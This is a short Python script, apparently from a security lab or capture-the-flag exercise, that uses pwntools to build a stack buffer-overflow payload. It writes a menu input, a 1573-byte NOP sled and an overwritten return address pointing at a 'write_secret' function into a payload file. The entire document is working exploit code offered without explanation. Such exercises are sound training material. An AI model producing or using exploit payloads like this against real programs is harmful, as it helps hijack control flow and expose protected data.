from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# return address
# r_addr = beginning of write_secret func
r_addr = 0x0000555555555229 
addr = p64(r_addr, endian='little')

nop = asm('nop', arch='amd64')

payload =  b"2\n" + nop*(1573) + addr

with open("./shellcode_payload_inj_w_secret" , "wb") as f:
	f.write(payload)


